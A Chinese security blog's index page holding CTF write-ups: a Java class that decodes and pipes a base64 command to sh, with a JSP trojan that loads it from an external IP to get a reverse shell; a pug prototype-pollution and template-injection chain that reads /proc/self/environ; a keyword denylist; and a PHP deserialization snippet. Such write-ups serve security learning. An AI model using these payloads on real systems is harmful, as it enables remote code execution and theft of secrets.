<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UrlClassLoader:URLClassLoader 可以加载远程类库和本地路径的类库</span><br><span class="line">#其实昨晚在做的时候有看到这个思路，但是当时发现有用到newInstance，所以就没往下继续想了，有点可惜</span><br><span class="line">Class.forName：装载一个类并且对其进行实例化的操作，装载过程中使用到的类加载器是当前类</span><br><span class="line">			Class.forName(xxx.xx.xx)返回的是一个类。Class.forName(xxx.xx.xx)的作用是要求JVM查找并加载指定的类，也就是说JVM会执行该类的静态代码段</span><br><span class="line">这里说说自己的理解:class.forname其实就是生成这个类的class</span><br></pre></td></tr></table></figure>

<p>首先写一个恶意类，并打包jar上传服务器，这里在学习一下了，如何创建一个jar包。。。<br><a target="_blank" rel="noopener" href="https://www.hangge.com/blog/cache/detail_2750.html">https://www.hangge.com/blog/cache/detail_2750.html</a></p>
<p>贴一下恶意包的代码:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tlif;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.UncheckedIOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">bad_class</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;echo xxxxx|base64 -d|sh&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;<span class="keyword">new</span> bad_class();&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来将其打包成jar包上传至服务器（记得配置java环境，不然运行不了）<br>然后上传访问该jar包的jsp木马</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.net.URL&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.net.URLClassLoader&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    URL url = <span class="keyword">new</span> URL(<span class="string">&quot;http://110.42.133.120/l3ctf_bp.jar&quot;</span>);</span><br><span class="line"></span><br><span class="line">    URLClassLoader ucl = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;url&#125;);</span><br><span class="line"></span><br><span class="line">    Class.forName(<span class="string">&quot;com.tlif.bad_class&quot;</span>,<span class="keyword">true</span>,ucl);</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>接下来访问jsp文件，即可反弹shell</p>
<h2 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h2><p>比赛的时候看都看没看的一道题，所以贴一下别人的wp收藏一下</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/11/11/bsides-ahmedabad-ctf-2021-0/">bsides-ahmedabad-ctf-2021</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-11-11</time><div class="content"><h2 id="pugpug"><a href="#pugpug" class="headerlink" title="pugpug"></a>pugpug</h2><p> 根据大师傅的wp，这题是原型链污染，但是我没看出来，所以认为还是应该回去理解一下，什么情景下会造成原型链污染？</p>
<h3 id="原型链污染形成原因"><a href="#原型链污染形成原因" class="headerlink" title="原型链污染形成原因"></a>原型链污染形成原因</h3><p><strong>如果可以控制并修改一个对象的原型，那么将可以影响所有和对象来自同一个类、父、组类的对象</strong></p>
<h3 id="什么时候可以利用"><a href="#什么时候可以利用" class="headerlink" title="什么时候可以利用"></a>什么时候可以利用</h3><p><strong>存在可控的对象键值</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">target, source</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>参数传入将经过deparam进行处理</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> input = deparam(req.originalUrl.slice(<span class="number">2</span>));</span><br></pre></td></tr></table></figure>

<p>在deparam中存在原型链污染，主要在下面这段代码，如果你传入了一个数组，含有多个键，那么就会进入以下循环进行赋值，我们可以跟一下值来分析一下</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">keys_last = keys.length - <span class="number">1</span>;                    </span><br><span class="line"><span class="keyword">for</span> ( ; i &lt;= keys_last; i++ ) &#123;</span><br><span class="line">                      key = keys[i] === <span class="string">&#x27;&#x27;</span> ? cur.length : keys[i];</span><br><span class="line">                      <span class="built_in">console</span>.log(key[i]);</span><br><span class="line">                      cur = cur[key] = i &lt; keys_last</span><br><span class="line">                      ? cur[key] || ( keys[i+<span class="number">1</span>] &amp;&amp; <span class="built_in">isNaN</span>( keys[i+<span class="number">1</span>] ) ? &#123;&#125; : [] )</span><br><span class="line">                      : val;</span><br><span class="line">                  &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到keys的数组的值分成了三部分:<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211112134020.png" alt="img"></p>
<p>再往下继续调试此时key分为三部分，cur为含有所有键以及其值是一个对象，当key为constructor，他就会向上继承去获取其constructor的值<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211112135929.png" alt="img"></p>
<p><strong>constructor属性的含义</strong>就是指向该对象的构造函数，所有函数（此时看成对象了）最终的构造函数都指向Function，而saasa是一个string，那么就是指向获得了一个string()，而所有函数的constructor都指向Function，也就是最原始的那个<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211112140206.png" alt="img"></p>
<p>而在这个Function()下面又有很多的函数，可以发现有一个正则表达式，也就是过滤我们字符的函数，我们可以通过污染这个正则表达式，来实现绕过，可以看到此时的三部分,cur[key]的值已经为那个正则表达式的内容了<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211112140336.png" alt="img" style="zoom:67%;"></p>
<p>最后直接将这个正则表达式赋值为我们传入的污染数据:<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211112140516.png" alt="img" style="zoom:67%;"></p>
<p><strong>梳理一下代码逻辑：</strong>如果我们传入一个数组数据，那么他会递归取值并进行重新赋值，直到最后一个值被赋出</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">传入:test=aaa&amp;test[<span class="keyword">constructor</span>][SafetifyRegExp]=ssss</span><br><span class="line">过程:cur=&#123;name:xxx,<span class="attr">test</span>:xxx&#125;</span><br><span class="line">cur=cur[test]=&gt;cur=aaa</span><br><span class="line">cur=cur[<span class="keyword">constructor</span>]=&gt;aaa[<span class="keyword">constructor</span>]=string()</span><br><span class="line">cur=cur[SafetifyRegExp]=&gt;string()[SafetifyRegExp]=正则表达式</span><br><span class="line">此时数组递归遍历结束，进行赋值</span><br><span class="line">string()[SafetifyRegExp]=ssss</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211112142528.png" alt="img" style="zoom:67%;">

<h3 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h3><p>接下来就是pug的模板注入了，想要直接getshell是没办法的因为他过滤得很严格而且我们无法绕过:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const denylist &#x3D; [&quot;%&quot;,&quot;(&quot;,&quot;global&quot;, &quot;process&quot;,&quot;mainModule&quot;,&quot;require&quot;,&quot;child_process&quot;,&quot;exec&quot;,&quot;\&quot;&quot;,&quot;&#39;&quot;,&quot;!&quot;,&quot;&#96;&quot;,&quot;:&quot;,&quot;-&quot;,&quot;_&quot;];</span><br></pre></td></tr></table></figure>

<p>但是在/serverstatus中有命令执行，并且这里可以传入参数，即req，res，但是由于options.options写死了，导致这里的命令是执行不了的，因为直接timeout500了==，所以我们先接触他，然后再控制options.args实现命令执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">app.get(&#39;&#x2F;serverstatus&#39;, (req, res) &#x3D;&gt; &#123;</span><br><span class="line">	const result &#x3D; child_process.spawnSync(&#39;ps&#39; , options.args, options.options);</span><br><span class="line">	out &#x3D; result.stdout.toString();</span><br><span class="line">	res.send(out);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>首先我们要让childe_process.spawnSync可以执行shell命令，所以需要打开这个模式，是要用<strong>url编码</strong>即可绕过:的过滤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%23&#123;options.options.shell%3Dtrue&#125;</span><br></pre></td></tr></table></figure>

<p>接下来再对options.args进行重新赋值，利用name进行传参绕过引号过滤（无法像shell:true）直接传参的原因：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name&#x3D;cpu,args%20;cat%20&#x2F;proc&#x2F;self&#x2F;environ&amp;content&#x3D;%23&#123;options.args%3D[options.args[0],name]&#125; </span><br></pre></td></tr></table></figure>

<p>最终可以发现执行命令为:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ps -eo cpu,args;cat &#x2F;proc&#x2F;self&#x2F;environ</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211112145153.png" alt="img" style="zoom:67%;">

<p>由于是windows下复现的，就不演示了</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/11/09/2021%E9%99%87%E5%8E%9F%E6%8A%97%E7%96%AB/">2021陇原抗疫</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-11-09</time><div class="content"><h2 id="eaaaasyphp"><a href="#eaaaasyphp" class="headerlink" title="eaaaasyphp"></a>eaaaasyphp</h2><p>一开始眼睛只看到hint了，疯狂试绕wakeup，发现没反应，才知道原来是php7.2版本的，要利用其他地方的类读bypass</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a=<span class="keyword">new</span> Esle();</span><br><span class="line">$b=<span class="keyword">new</span> Bypass();</span><br><span class="line">$b-&gt;str4=<span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line">$a-&gt;c=$b;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>

<p>发现api服务是<code>fastcgi</code>，</p>
</div><hr></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/">18</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By vague huang</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>